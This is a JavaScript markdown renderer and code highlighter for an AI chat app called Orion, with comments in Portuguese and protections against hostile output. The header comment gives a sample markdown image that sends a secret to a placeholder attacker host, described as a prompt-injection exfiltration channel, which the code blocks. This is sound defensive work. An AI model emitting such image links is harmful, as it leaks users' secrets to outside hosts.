/* ==========================================================================
   ORION — md.js | markdown seguro + realce de código (puro, sem DOM)
   ==========================================================================
   Regras de segurança (ORION_REGRAS.md 10–12), todas cobertas em tests/front:
     1. escapa & < > " ' ANTES de qualquer formatação; nada do texto vira tag;
     2. link só http(s)/mailto, com `rel` seguro e o host visível quando o texto engana;
     3. a única imagem renderizada é a gerada pelo próprio Orion (/imagens/<arquivo>):
        imagem de outro host é canal de exfiltração por prompt injection
        (![x](https://atacante/?d=<segredo>) e o navegador busca a URL sozinho);
     4. marcadores internos (…) são removidos da entrada: ninguém forja um.
   ========================================================================== */
(function (raiz, fabrica) {
    const api = fabrica(typeof module === 'object' ? require('./util.js') : raiz.Orion.util);
    if (typeof module === 'object' && module.exports) module.exports = api;
    else (raiz.Orion = raiz.Orion || {}).md = api;
})(typeof window !== 'undefined' ? window : globalThis, function (U) {
    'use strict';

    const { escapar, hostDe } = U;

    /* ── imagens: só o que o Orion mesmo serve ─────────────────────────── */
    let basesImagem = ['http://127.0.0.1:8000/imagens/', 'http://localhost:8000/imagens/'];
    function configurar({ basesImagens } = {}) {
        if (Array.isArray(basesImagens)) basesImagem = basesImagens.map(String);
    }
    function imagemPermitida(url) {
        for (const base of basesImagem) {
            if (url.startsWith(base)) return /^[\w-][\w.-]*$/.test(url.slice(base.length));   // só nome de arquivo
        }
        return false;
    }

    /* ── realce de código ──────────────────────────────────────────────── */
    const ALIAS = {
        js: 'javascript', jsx: 'javascript', mjs: 'javascript', cjs: 'javascript', ts: 'typescript', tsx: 'typescript',
        py: 'python', python3: 'python', sh: 'bash', shell: 'bash', zsh: 'bash', console: 'bash',
        ps1: 'powershell', pwsh: 'powershell', yml: 'yaml', htm: 'html', xml: 'html', svg: 'html',
        'c++': 'cpp', cc: 'cpp', h: 'c', cs: 'csharp', rs: 'rust', golang: 'go', jsonc: 'json',
        postgres: 'sql', postgresql: 'sql', sqlite: 'sql', mysql: 'sql', patch: 'diff', toml: 'ini',
    };
    const conj = s => new Set(s.split(/\s+/).filter(Boolean));
    const KW_C = conj(`const let var function return if else for while do switch case break continue new class extends
        import export from default async await try catch finally throw typeof instanceof in of this super static get set
        yield void delete interface type enum implements public private protected readonly abstract as namespace declare
        package final throws synchronized int long double float boolean char byte short unsigned signed struct union
        typedef extern sizeof include define template typename using virtual override auto bool func var chan go defer
        range select fallthrough map fn let mut pub impl trait use mod match loop move ref crate where unsafe dyn self`);
    const LIT_C = conj('true false null undefined NaN Infinity nil None this super Self');
    const KW_PY = conj(`and as assert async await break class continue def del elif else except finally for from global
        if import in is lambda nonlocal not or pass raise return try while with yield match case`);
    const LIT_PY = conj(`True False None self cls print len range int str float list dict set tuple open isinstance super
        type enumerate zip map filter sorted sum min max abs any all bool bytes Path`);
    const KW_SQL = conj(`select from where join left right inner outer full on group by order having limit offset insert
        into values update set delete create table index view alter drop add column primary key foreign references unique
        not null default and or in is like between exists union all distinct as case when then else end asc desc with
        returning pragma virtual using begin commit rollback if autoincrement match`);
    const LIT_SQL = conj('count sum avg min max bm25 coalesce integer text real blob varchar int true false');
    const KW_SH = conj(`if then else elif fi for while until do done case esac in function return exit export local set
        unset source alias`);
    const LIT_SH = conj(`echo cd ls cat grep sed awk git sudo mkdir rm cp mv curl wget python pip uv npm node docker
        kill ps chmod chown tar find xargs head tail sort uniq wc`);
    const KW_PS = conj(`if else elseif foreach for while switch function return param begin process end try catch finally
        throw break continue in`);
    const LIT_JSON = conj('true false null');

    const STR_DQ = '"(?:\\\\[\\s\\S]|[^"\\\\\\n])*"?';
    const STR_SQ = "'(?:\\\\[\\s\\S]|[^'\\\\\\n])*'?";
    const STR_BT = '`(?:\\\\[\\s\\S]|[^`\\\\])*`?';
    const NUM = '\\b0[xX][\\da-fA-F_]+\\b|\\b\\d[\\d_]*(?:\\.\\d+)?(?:[eE][+-]?\\d+)?\\b';

    // cada linguagem: lista ordenada de [classe, regex] + conjuntos de palavras
    const LINGUAS = {
        python: { regras: [['c', '#[^\\n]*'],
                           ['s', '[rRbBfFuU]{0,2}(?:"""[\\s\\S]*?(?:"""|$)|\'\'\'[\\s\\S]*?(?:\'\'\'|$)|' + STR_DQ + '|' + STR_SQ + ')'],
                           ['f', '@[A-Za-z_][\\w.]*'], ['n', NUM]], kw: KW_PY, lit: LIT_PY, chamada: true },
        clike: { regras: [['c', '//[^\\n]*|/\\*[\\s\\S]*?(?:\\*/|$)'], ['s', STR_DQ + '|' + STR_SQ + '|' + STR_BT], ['n', NUM]],
                 kw: KW_C, lit: LIT_C, chamada: true },
        sql: { regras: [['c', '--[^\\n]*|/\\*[\\s\\S]*?(?:\\*/|$)'], ['s', "'(?:''|[^'])*'?|" + STR_DQ], ['n', NUM]],
               kw: KW_SQL, lit: LIT_SQL, ci: true, chamada: true },
        bash: { regras: [['c', '(?:^|(?<=\\s))#[^\\n]*'], ['s', STR_DQ + '|' + STR_SQ], ['v', '\\$\\{[^}\\n]*\\}|\\$[A-Za-z_]\\w*|\\$[?#@*0-9]'],
                         ['a', '(?<=\\s)--?[A-Za-z][\\w-]*'], ['n', NUM]], kw: KW_SH, lit: LIT_SH },
        powershell: { regras: [['c', '<#[\\s\\S]*?(?:#>|$)|#[^\\n]*'], ['s', STR_DQ + '|' + STR_SQ], ['v', '\\$\\{[^}\\n]*\\}|\\$[A-Za-z_]\\w*'],
                               ['f', '\\b[A-Z][a-z]+-[A-Z][A-Za-z]*\\b'], ['a', '(?<=\\s)-[A-Za-z]\\w*'], ['n', NUM]],
                      kw: KW_PS, lit: LIT_JSON, ci: true },
        json: { regras: [['a', '"(?:\\\\[\\s\\S]|[^"\\\\\\n])*"(?=\\s*:)'], ['s', STR_DQ], ['n', '-?\\b\\d+(?:\\.\\d+)?(?:[eE][+-]?\\d+)?\\b']],
                kw: new Set(), lit: LIT_JSON },
        yaml: { regras: [['c', '#[^\\n]*'], ['a', '^[ \\t-]*[\\w.\\-]+(?=\\s*:(?:\\s|$))'], ['s', STR_DQ + '|' + STR_SQ], ['n', NUM]],
                kw: new Set(), lit: conj('true false null yes no on off'), multilinha: true },
        ini: { regras: [['c', '[#;][^\\n]*'], ['t', '^\\[[^\\]\\n]+\\]'], ['a', '^[ \\t]*[\\w.\\-]+(?=\\s*=)'], ['s', STR_DQ + '|' + STR_SQ], ['n', NUM]],
               kw: new Set(), lit: conj('true false'), multilinha: true },
        html: { regras: [['c', '<!--[\\s\\S]*?(?:-->|$)'], ['t', '</?[A-Za-z][\\w:-]*'], ['a', '[\\w:@-]+(?=\\s*=)'], ['s', STR_DQ + '|' + STR_SQ]],
                kw: new Set(), lit: new Set() },
        css: { regras: [['c', '/\\*[\\s\\S]*?(?:\\*/|$)'], ['s', STR_DQ + '|' + STR_SQ], ['k', '@[\\w-]+'], ['n', '#[\\da-fA-F]{3,8}\\b'],
                        ['a', '[\\w-]+(?=\\s*:(?!:))'], ['n', '-?\\d*\\.?\\d+(?:px|em|rem|%|vh|vw|s|ms|deg|fr)?']],
               kw: new Set(), lit: new Set() },
    };
    const FAMILIA = { javascript: 'clike', typescript: 'clike', java: 'clike', c: 'clike', cpp: 'clike', csharp: 'clike',
                      go: 'clike', rust: 'clike', php: 'clike', kotlin: 'clike', swift: 'clike' };
    const _cache = new Map();

    function _compilar(nome) {
        if (_cache.has(nome)) return _cache.get(nome);
        const L = LINGUAS[nome];
        const partes = L.regras.map(([, src]) => `(${src})`);
        partes.push('([A-Za-z_][\\w$-]*)');                         // palavra
        const re = new RegExp(partes.join('|'), 'g' + (L.multilinha ? 'm' : ''));
        const c = { L, re, classes: L.regras.map(r => r[0]) };
        _cache.set(nome, c);
        return c;
    }

    const LIMITE_REALCE = 30000;

    /** HTML do código com <span class="tk-…">; qualquer coisa fora dos tokens é escapada */
    function realcar(codigo, linguagem) {
        const bruto = String(codigo);
        let nome = String(linguagem || '').toLowerCase().replace(/[^\w+#.-]/g, '');
        nome = ALIAS[nome] || nome;
        if (nome === 'diff') {
            return bruto.split('\n').map(l => {
                const cls = /^(\+\+\+|---)/.test(l) ? 'tk-k' : l.startsWith('+') ? 'tk-ins' : l.startsWith('-') ? 'tk-del' : l.startsWith('@@') ? 'tk-k' : '';
                return cls ? `<span class="${cls}">${escapar(l)}</span>` : escapar(l);
            }).join('\n');
        }
        const familia = LINGUAS[nome] ? nome : FAMILIA[nome];
        if (!familia || bruto.length > LIMITE_REALCE) return escapar(bruto);
        const { L, re, classes } = _compilar(familia);
        re.lastIndex = 0;
        let saida = '', fim = 0, m;
        while ((m = re.exec(bruto)) !== null) {
            if (m[0] === '') { re.lastIndex++; continue; }
            saida += escapar(bruto.slice(fim, m.index));
            fim = m.index + m[0].length;
            let cls = '';
            for (let i = 0; i < classes.length; i++) if (m[i + 1] !== undefined) { cls = classes[i]; break; }
            if (!cls) {                                              // palavra
                const p = m[classes.length + 1];
                const chave = L.ci ? p.toLowerCase() : p;
                if (L.kw.has(chave)) cls = 'k';
                else if (L.lit.has(chave)) cls = 'b';
                else if (L.chamada && /^\s*\(/.test(bruto.slice(fim, fim + 3))) cls = 'f';
            }
            saida += cls ? `<span class="tk-${cls}">${escapar(m[0])}</span>` : escapar(m[0]);
        }
        return saida + escapar(bruto.slice(fim));
    }

    /* ── inline ────────────────────────────────────────────────────────── */
    const MARCA_A = '', MARCA_B = '';
    const RE_MARCA = /[]/g;

    function _link(texto, url) {
        const ok = /^(?:https?:\/\/|mailto:)/i.test(url);
        if (!ok) return null;
        const host = hostDe(url);
        const t = emphasis(texto);
        const semelhante = !host || U.norm(texto).includes(U.norm(host)) || /^https?:\/\//i.test(texto);
        const selo = semelhante ? '' : `<span class="md-host" aria-hidden="true">${escapar(host)}</span>`;
        return `<a class="md-link" href="${url}" target="_blank" rel="noopener noreferrer nofollow"` +
               `${host ? ` title="${escapar(host)}"` : ''}>${t}</a>${selo}`;
    }

    function emphasis(s) {
        return s
            .replace(/\*\*(?=\S)([\s\S]*?\S)\*\*/g, '<strong>$1</strong>')
            .replace(/(?<![\w_])__(?=\S)([\s\S]*?\S)__(?![\w_])/g, '<strong>$1</strong>')
            .replace(/(?<![\w*])\*(?=[^\s*])([^*\n]*?[^\s*])\*(?![\w*])/g, '<em>$1</em>')
            .replace(/(?<![\w_])_(?=[^\s_])([^_\n]*?[^\s_])_(?![\w_])/g, '<em>$1</em>')
            .replace(/~~(?=\S)([\s\S]*?\S)~~/g, '<del>$1</del>');
    }

    /** `bruto` = texto SEM escapar; devolve HTML */
    function inline(bruto) {
        let s = escapar(String(bruto).replace(RE_MARCA, ''));
        const guardados = [];
        const guardar = html => { guardados.push(html); return `${MARCA_A}${guardados.length - 1}${MARCA_B}`; };

        // 1) código inline (conteúdo intocado)
        s = s.replace(/(`+)(?!`)([\s\S]*?[^`])\1(?!`)/g, (_, _c, cod) => guardar(`<code>${cod.replace(/^ (.*) $/, '$1')}</code>`));
        // 2) escapes de markdown: \* → entidade numérica (literal, segura)
        s = s.replace(/\\([\\`*_{}[\]()#+\-.!~|>])/g, (_, c) => `&#${c.charCodeAt(0)};`);
        // 3) imagem: só a do Orion; o resto vira aviso em texto
        //    `/imagens/<arquivo>` (sem host) é a forma que as ferramentas do Orion devolvem: vira o
        //    endereço do cérebro configurado, seja qual for o host pelo qual você abriu o app
        s = s.replace(/!\[([^\]\n]*)\]\(\s*(https?:\/\/[^\s)]+|\/imagens\/[^\s)]+)(?:\s+&quot;[^\n]*?&quot;)?\s*\)/g, (_, alt, bruto) => {
            const url = bruto.startsWith('/imagens/') ? basesImagem[0] + bruto.slice('/imagens/'.length) : bruto;
            return guardar(imagemPermitida(url)
                ? `<img src="${url}" alt="${alt}" class="msg-img" loading="lazy" decoding="async">`
                : `<span class="msg-img-bloqueada">[imagem externa bloqueada${alt ? ': ' + alt : ''}]</span>`);
        });
        // 4) link [texto](url)
        s = s.replace(/\[([^\]\n]+)\]\(\s*([^\s)]+)(?:\s+&quot;[^\n]*?&quot;)?\s*\)/g, (todo, texto, url) => {
            const a = _link(texto, url);
            return a ? guardar(a) : todo;
        });
        // 5) URL solta
        s = s.replace(/(^|[\s(])(https?:\/\/[^\s<]+)/g, (todo, ini, url) => {
            let u = url, cauda = '';
            const corte = u.search(/&(?:lt|gt|quot);/);
            if (corte >= 0) { cauda = u.slice(corte); u = u.slice(0, corte); }
            const m = u.match(/[.,;:!?)]+$/);
            if (m) {
                const abre = (u.match(/\(/g) || []).length, fecha = (u.match(/\)/g) || []).length;
                let tira = m[0];
                if (tira.startsWith(')') && fecha <= abre) tira = tira.replace(/^\)+/, '');
                cauda = u.slice(u.length - tira.length) + cauda;
                u = u.slice(0, u.length - tira.length);
            }
            return u ? `${ini}${guardar(_link(u, u))}${cauda}` : todo;
        });
        // 6) ênfase no que sobrou (URLs e código já estão protegidos)
        s = emphasis(s);
        // 7) restaura (a restauração de link pode conter outro marcador: laço curto)
        for (let i = 0; i < 3 && s.includes(MARCA_A); i++) {
            s = s.replace(new RegExp(`${MARCA_A}(\\d+)${MARCA_B}`, 'g'), (_, n) => guardados[+n] ?? '');
        }
        return s.replace(RE_MARCA, '');
    }

    /* ── blocos ────────────────────────────────────────────────────────── */
    const RE_FENCE = /^ {0,3}(`{3,}|~{3,})[ \t]*([^\s`]*)[^`\n]*$/;
    const RE_TITULO = /^ {0,3}(#{1,6})[ \t]+(.*?)[ \t]*#*[ \t]*$/;
    const RE_HR = /^ {0,3}([-*_])(?:[ \t]*\1){2,}[ \t]*$/;
    const RE_ITEM = /^( *)([-*+]|\d{1,9}[.)])[ \t]+(.*)$/;
    const RE_SEP_TABELA = /^[ \t]*\|?[ \t]*:?-{2,}:?[ \t]*(?:\|[ \t]*:?-{2,}:?[ \t]*)*\|?[ \t]*$/;

    const NOMES_LINGUA = { javascript: 'JavaScript', typescript: 'TypeScript', python: 'Python', bash: 'Shell', powershell: 'PowerShell',
                           sql: 'SQL', json: 'JSON', yaml: 'YAML', html: 'HTML', css: 'CSS', csharp: 'C#', cpp: 'C++', c: 'C',
                           java: 'Java', go: 'Go', rust: 'Rust', diff: 'Diff', ini: 'INI', markdown: 'Markdown', text: 'Texto' };

    function _codigo(linguagem, linhas, aberto) {
        const bruto = linhas.join('\n');
        const nome = (linguagem || '').toLowerCase().replace(/[^\w+#.-]/g, '');
        const canon = ALIAS[nome] || nome;
        const rotulo = NOMES_LINGUA[canon] || (canon ? escapar(canon) : 'Código');
        return `<div class="md-code${aberto ? ' md-code-open' : ''}" data-lang="${escapar(canon)}">` +
               `<div class="md-code-head"><span class="md-code-lang">${rotulo}</span>` +
               `<button type="button" class="md-copy" aria-label="Copiar código">Copiar</button></div>` +
               `<pre tabindex="0"><code class="hl">${realcar(bruto, canon)}</code></pre></div>`;
    }

    const celulas = linha => {
        let t = linha.trim();
        if (t.startsWith('|')) t = t.slice(1);
        if (t.endsWith('|') && !t.endsWith('\\|')) t = t.slice(0, -1);
        return t.split(/(?<!\\)\|/).map(c => c.trim().replace(/\\\|/g, '|'));
    };

    function _tabela(linhas) {
        const cab = celulas(linhas[0]);
        const alin = celulas(linhas[1]).map(c => (c.startsWith(':') && c.endsWith(':')) ? 'center' : c.endsWith(':') ? 'right' : c.startsWith(':') ? 'left' : '');
        const td = (tag, c, i) => `<${tag}${alin[i] ? ` style="text-align:${alin[i]}"` : ''}>${inline(c)}</${tag}>`;
        let h = '<div class="md-table-wrap"><table><thead><tr>' + cab.map((c, i) => td('th', c, i)).join('') + '</tr></thead><tbody>';
        for (const l of linhas.slice(2)) {
            const cs = celulas(l);
            h += '<tr>' + cab.map((_, i) => td('td', cs[i] ?? '', i)).join('') + '</tr>';
        }
        return h + '</tbody></table></div>';
    }

    const comecaBloco = (l, prox) =>
        RE_FENCE.test(l) || RE_TITULO.test(l) || RE_HR.test(l) || /^ {0,3}>/.test(l) ||
        (RE_ITEM.test(l) && l.search(/\S/) < 4) || (l.includes('|') && prox !== undefined && RE_SEP_TABELA.test(prox) && prox.includes('-'));

    function _lista(linhas, i) {
        const primeiro = RE_ITEM.exec(linhas[i]);
        const base = primeiro[1].length;
        const ordenada = /\d/.test(primeiro[2]);
        const inicio = ordenada ? parseInt(primeiro[2], 10) : 1;
        const itens = [];
        while (i < linhas.length) {
            const m = RE_ITEM.exec(linhas[i]);
            if (!m || m[1].length < base || m[1].length > base + 1 || /\d/.test(m[2]) !== ordenada) break;
            const largura = m[1].length + m[2].length + 1;
            const corpo = [m[3]];
            i++;
            while (i < linhas.length) {
                const l = linhas[i];
                if (l.trim() === '') {
                    // linha em branco só continua o item se vier algo indentado depois
                    let j = i + 1;
                    while (j < linhas.length && linhas[j].trim() === '') j++;
                    if (j < linhas.length && linhas[j].search(/\S/) >= Math.min(largura, base + 2)) { corpo.push(''); i++; continue; }
                    break;
                }
                const indent = l.search(/\S/);
                if (indent >= Math.min(largura, base + 2)) { corpo.push(l.slice(Math.min(indent, largura))); i++; continue; }
                if (!comecaBloco(l) && corpo[corpo.length - 1] !== '') { corpo.push(l.trim()); i++; continue; }   // continuação preguiçosa
                break;
            }
            itens.push(corpo);
            if (i < linhas.length && linhas[i].trim() === '') {
                let j = i;
                while (j < linhas.length && linhas[j].trim() === '') j++;
                const prox = j < linhas.length ? RE_ITEM.exec(linhas[j]) : null;
                if (prox && prox[1].length >= base && prox[1].length < base + 2 && /\d/.test(prox[2]) === ordenada) i = j; else break;
            }
        }
        const tag = ordenada ? 'ol' : 'ul';
        let html = `<${tag}${ordenada && inicio !== 1 ? ` start="${inicio}"` : ''}>`;
        for (const corpo of itens) {
            let tarefa = '';
            const t = /^\[( |x|X)\][ \t]+/.exec(corpo[0]);
            if (t) {
                const feito = t[1] !== ' ';
                tarefa = `<span class="md-check${feito ? ' feito' : ''}" role="img" aria-label="${feito ? 'feito' : 'pendente'}"></span>`;
                corpo[0] = corpo[0].slice(t[0].length);
            }
            let interno = blocos(corpo);
            // item "apertado" (sem linha em branco): o primeiro parágrafo vira texto direto no <li>
            if (!corpo.includes('')) interno = interno.replace(/^<p>([\s\S]*?)<\/p>/, '$1');
            html += `<li${tarefa ? ' class="md-tarefa"' : ''}>${tarefa}${interno}</li>`;
        }
        return { html: html + `</${tag}>`, i };
    }

    function blocos(linhas) {
        let saida = '';
        let i = 0;
        while (i < linhas.length) {
            const l = linhas[i];
            if (l.trim() === '') { i++; continue; }

            let m = RE_FENCE.exec(l);
            if (m) {
                const marca = m[1][0], tam = m[1].length;
                const fecha = new RegExp(`^ {0,3}\\${marca}{${tam},}[ \\t]*$`);
                const cod = [];
                i++;
                let fechou = false;
                while (i < linhas.length) {
                    if (fecha.test(linhas[i])) { fechou = true; i++; break; }
                    cod.push(linhas[i]);
                    i++;
                }
                saida += _codigo(m[2], cod, !fechou);
                continue;
            }
            if ((m = RE_TITULO.exec(l))) {
                const n = m[1].length;
                saida += `<div class="md-h md-h${n}" role="heading" aria-level="3">${inline(m[2])}</div>`;
                i++;
                continue;
            }
            if (RE_HR.test(l)) { saida += '<hr>'; i++; continue; }
            if (/^ {0,3}>/.test(l)) {
                const q = [];
                while (i < linhas.length && /^ {0,3}>/.test(linhas[i])) { q.push(linhas[i].replace(/^ {0,3}> ?/, '')); i++; }
                saida += `<blockquote>${blocos(q)}</blockquote>`;
                continue;
            }
            if (l.includes('|') && i + 1 < linhas.length && RE_SEP_TABELA.test(linhas[i + 1]) && linhas[i + 1].includes('-')) {
                const t = [l, linhas[i + 1]];
                i += 2;
                while (i < linhas.length && linhas[i].trim() !== '' && linhas[i].includes('|')) { t.push(linhas[i]); i++; }
                saida += _tabela(t);
                continue;
            }
            if (RE_ITEM.test(l) && l.search(/\S/) < 4) {
                const r = _lista(linhas, i);
                saida += r.html;
                i = r.i;
                continue;
            }
            const par = [l.trim()];
            i++;
            while (i < linhas.length && linhas[i].trim() !== '' && !comecaBloco(linhas[i], linhas[i + 1])) { par.push(linhas[i].trim()); i++; }
            saida += `<p>${par.map(inline).join('<br>')}</p>`;
        }
        return saida;
    }

    /** markdown (texto bruto) → HTML seguro */
    function renderizar(texto) {
        return blocos(String(texto ?? '').replace(/\r\n?/g, '\n').replace(RE_MARCA, '').split('\n'));
    }

    /**
     * Streaming: o que veio antes do último "\n\n" fora de cerca de código não muda mais, então é
     * renderizado uma vez e reaproveitado; só a cauda é refeita a cada quadro (custo ~constante).
     */
    function pontoEstavel(texto) {
        const linhas = texto.split('\n');
        let pos = 0, dentro = false, marca = '', ultimo = 0;
        for (let i = 0; i < linhas.length; i++) {
            const l = linhas[i];
            const f = RE_FENCE.exec(l);
            if (f) {
                if (!dentro) { dentro = true; marca = f[1][0]; }
                else if (f[1][0] === marca && f[2] === '') dentro = false;
            }
            pos += l.length + 1;
            if (!dentro && l.trim() === '' && i < linhas.length - 1) ultimo = pos;
        }
        return ultimo;
    }

    function criarRenderStreaming() {
        let cabecaTexto = '', cabecaHtml = '';
        return {
            renderizar(texto) {
                texto = String(texto ?? '').replace(/\r\n?/g, '\n');
                if (!texto.startsWith(cabecaTexto)) { cabecaTexto = ''; cabecaHtml = ''; }   // texto foi reescrito
                const corte = pontoEstavel(texto);
                if (corte > cabecaTexto.length) {
                    cabecaHtml += renderizar(texto.slice(cabecaTexto.length, corte));
                    cabecaTexto = texto.slice(0, corte);
                }
                return cabecaHtml + renderizar(texto.slice(cabecaTexto.length));
            },
            reiniciar() { cabecaTexto = ''; cabecaHtml = ''; },
        };
    }

    /** texto para leitura em voz alta: sem código, links viram só o texto, sem marcação */
    function paraFala(texto) {
        return String(texto ?? '')
            .replace(/```[\s\S]*?(?:```|$)/g, ' ')
            .replace(/`[^`\n]*`/g, ' ')
            .replace(/!\[[^\]]*\]\([^)]*\)/g, ' ')
            .replace(/\[([^\]]+)\]\([^)]*\)/g, '$1')
            .replace(/https?:\/\/\S+/g, ' ')
            .replace(/^\s*(?:[#>]+|[-*+]|\d+[.)])\s+/gm, '')
            .replace(/[*_~|#]/g, '')
            .replace(/\s+/g, ' ')
            .trim();
    }

    return { renderizar, inline, realcar, escapar, configurar, imagemPermitida, criarRenderStreaming, pontoEstavel, paraFala };
});
